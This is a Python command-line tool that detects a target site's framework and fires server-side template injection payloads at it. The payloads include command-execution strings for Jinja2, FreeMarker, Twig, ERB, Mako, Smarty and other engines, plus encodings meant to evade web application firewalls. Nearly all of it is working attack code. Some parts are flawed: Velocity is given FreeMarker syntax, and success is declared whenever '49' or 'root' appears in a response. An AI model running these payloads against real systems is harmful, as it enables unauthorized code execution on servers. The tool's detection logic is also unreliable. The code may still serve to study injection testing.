import requests
import base64
import urllib.parse
import random
import argparse
import logging
from wappalyzer import Wappalyzer, WebPage
from time import sleep

# Set up logging for detailed info
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Step 1: Detect Technology Stack using Wappalyzer
def detect_technology(url):
    try:
        logging.info(f"[*] Detecting technology for: {url}")
        webpage = WebPage.new_from_url(url)
        wappalyzer = Wappalyzer.latest()
        technologies = wappalyzer.analyze(webpage)
        return technologies
    except Exception as e:
        logging.error(f"Error detecting technology: {e}")
        return []

# Step 2: Comprehensive SSTI Payloads Database (with more technologies)
ssti_payloads_db = {
    'jinja2': [
        "{{7*7}}", "{{config.items()}}", "{{self.__class__.__mro__[2].__subclasses__()}}"
    ],
    'jsp': [
        "${7*7}", "${T(java.lang.Runtime).getRuntime().exec('id')}", "${applicationScope['jsp']}"
    ],
    'thymeleaf': [
        "${7*7}", "${T(java.lang.Runtime).getRuntime().exec('id')}"
    ],
    'freemarker': [
        "${7*7}", "<#assign x=7*7>${x}", "<#assign x='freemarker.template.utility.Execute'?new()>${x('id')}"
    ],
    'velocity': [
        "#set($x=7*7)$x", "#set($e='freemarker.template.utility.Execute'?new())$e('id')"
    ],
    'twig': [
        "{{7*7}}", "{{_self.env.registerUndefinedFilterCallback('exec') or _self.env.getFilter('exec')('id')}}"
    ],
    'python': [
        "{{7*7}}", "{{''.__class__.__mro__[2].__subclasses__()[40]('id',shell=True)}}"
    ],
    'ruby': [
        "{{7*7}}", "<%= `id` %>", "<%= 7*7 %>"
    ],
    'go': [
        "{{7*7}}", "{{print 7*7}}", "{{`id`}}"
    ],
    'erb': [
        "<%= 7*7 %>", "<%= `id` %>", "<%= system('id') %>"
    ],
    'mako': [
        "${7*7}", "${__import__('os').popen('id').read()}"
    ],
    'django': [
        "{{7*7}}", "{{ ''.__class__.__mro__[2].__subclasses__()[59]('id').read() }}"
    ],
    'tornado': [
        "{{7*7}}", "{{self.application.settings.items()}}"
    ],
    'smarty': [
        "{7*7}", "{php} echo system('id'); {/php}"
    ],
    'php': [
        "{${7*7}}", "<?php system('id'); ?>"
    ],
    'colddfusion': [
        "#evaluate('7*7')#", "<cfset x = 7*7>"
    ]
}

# Step 3: Select SSTI Payload for Detected Technology
def get_ssti_payload(technologies):
    for tech in technologies:
        tech_lower = tech.lower()
        if tech_lower in ssti_payloads_db:
            return ssti_payloads_db[tech_lower]
    
    return None

# Step 4: WAF Evasion Techniques (Encoding and Obfuscation)
def encode_payload(payload):
    try:
        encoded_payloads = {
            'url_encoded': urllib.parse.quote(payload),
            'base64_encoded': base64.b64encode(payload.encode()).decode(),
            'random_case': ''.join(random.choice([char.upper(), char.lower()]) for char in payload),
            'split_with_comments': payload.replace(' ', '/**/'),
            'hex_encoded': payload.encode('utf-8').hex(),
            'unicode_encoded': ''.join('\\u{:04x}'.format(ord(c)) for c in payload)
        }
        return encoded_payloads
    except Exception as e:
        logging.error(f"Error encoding payload: {e}")
        return {}

# Step 5: Main Testing Function (with error handling, retries, and proxy support)
def test_ssti(url, headers=None, proxy=None):
    logging.info(f"[*] Analyzing website: {url}")
    technologies = detect_technology(url)
    if not technologies:
        logging.error("[-] No technology detected, exiting.")
        return
    
    logging.info(f"[+] Detected Technologies: {technologies}")
    ssti_payloads = get_ssti_payload(technologies)
    if not ssti_payloads:
        logging.warning("[-] No suitable SSTI payloads found for detected technology.")
        return
    
    for ssti_payload in ssti_payloads:
        logging.info(f"\n[+] Original SSTI Payload: {ssti_payload}")
        
        encoded_payloads = encode_payload(ssti_payload)
        for method, encoded in encoded_payloads.items():
            logging.info(f"\n[+] Testing with {method}: {encoded}")
            response = send_payload(url, encoded, headers, proxy)
            if response and check_response_for_ssti(response):
                logging.info(f"[+] SSTI vulnerability detected using {method}!")
                break

# Step 6: Send Payload with Optional Custom Headers and Proxy Support
def send_payload(url, payload, headers=None, proxy=None, retries=3, delay=2):
    try:
        data = {"input": payload}
        default_headers = {
            'User-Agent': 'Mozilla/5.0'
        }
        
        if headers:
            default_headers.update(headers)
        
        proxies = {"http": proxy, "https": proxy} if proxy else None
        
        for attempt in range(retries):
            response = requests.post(url, data=data, headers=default_headers, proxies=proxies, verify=False)
            if response.status_code == 200:
                return response.text
            else:
                logging.warning(f"Attempt {attempt+1} failed with status code: {response.status_code}. Retrying...")
                sleep(delay)
    except requests.exceptions.RequestException as e:
        logging.error(f"Error sending payload: {e}")
    return None

# Step 7: Check Response for SSTI Indication (with improved validation)
def check_response_for_ssti(response):
    try:
        if any(indicator in response for indicator in ["49", "uid=", "root"]):  # More indicators for successful SSTI
            return True
    except Exception as e:
        logging.error(f"Error checking response for SSTI: {e}")
    return False

# Command-line argument parsing
def parse_arguments():
    parser = argparse.ArgumentParser(description="SSTI Detection Tool with WAF Bypass")
    parser.add_argument("-u", "--url", required=True, help="Vulnerable URL to test SSTI")
    parser.add_argument("-H", "--headers", nargs="+", help="Custom headers to include (format: key:value)")
    parser.add_argument("-p", "--proxy", help="Proxy to use for requests (e.g., http://127.0.0.1:8080 for Burp)")
    
    return parser.parse_args()

# Convert header arguments from key:value to a dictionary
def process_headers(header_args):
    headers = {}
    try:
        if header_args:
            for h in header_args:
                key, value = h.split(":")
                headers[key.strip()] = value.strip()
    except Exception as e:
        logging.error(f"Error processing headers: {e}")
    return headers

if __name__ == "__main__":
    args = parse_arguments()
    
    # Convert headers from arguments
    headers = process_headers(args.headers)
    
    # Start the SSTI test with optional proxy
    test_ssti(args.url, headers, args.proxy)
